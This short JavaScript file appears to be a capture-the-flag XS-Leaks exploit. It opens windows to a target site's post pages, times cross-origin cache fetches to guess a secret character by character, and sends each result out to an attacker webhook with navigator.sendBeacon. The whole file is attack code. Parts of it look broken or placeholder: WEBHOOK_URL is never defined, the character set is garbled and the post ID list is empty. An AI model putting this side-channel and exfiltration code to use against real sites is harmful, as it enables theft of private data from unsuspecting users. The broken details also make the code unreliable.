
BASE_URL ="URL"
EVEL_SERVER = "URL"

SOURCE_URL = [
	`${URL}/assets/milligram`,
	`${URL}/assets/normalize`,
]

const sleep = (ms) => new Promise((r) => setTimeout(r,ms));
const wait = (url) => new Promise( async (resolve) => {
	while(true) {
		try{
			url.document;
		} catch {
			resolve();
			break;
		}
		await sleep(20);
	}
})

CHARS = "abcdefghadasd}"

MAX_REQ = 10;
MAX_TRIES = 3;
LIST_POST_ID = [];

// execute idea

const measureOne = async (url) => {
	// init to make sure work right
	const initReq = open(url);
	await wait(initReq);

	let reqs = [];
	for (let i = 0; i < MAX_REQ; i++) {
		reqs.push(open(url));
	}

	Promise.all(reqs.map((r) => wait(r)));

	const start = performance.now();

	await Promise.all(SOURCE_URL.map((u) => fetch(u,{mode:"no-cors"})));

	const end = performance.now();

	return end - start;	
}

const measure = async (url) => {
	let avg = 0;
	for (let i = 0; i < MAX_TRIES; i++) {
		const t = await measureOne(url);
		avg += t;
	}

	avg = avg / MAX_TRIES;
	return avg;
}

const leakOne = async (id) => {
	const url = `${BASE_URL}/post.php?id=${id}`;
	return measure(url);
}

const leak = async () => {
	min_T = 10000000000;
	min_chr = '';

	for (let i = 0; i < LIST_POST_ID.length; i++) {
		const t = await leakOne(LIST_POST_ID[i]);
		if (t < min_T) {
			min_T = t;
			min_chr = CHARS[i];
		}

		navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
			"STT": i,
			"CHR": CHARS[i],
			"TIME": t,
			"min_char": min_chr,
			"min_time": min_T
		}))
		await sleep(1000);
	}
}


const main = async () => {
	await leak();
}
main();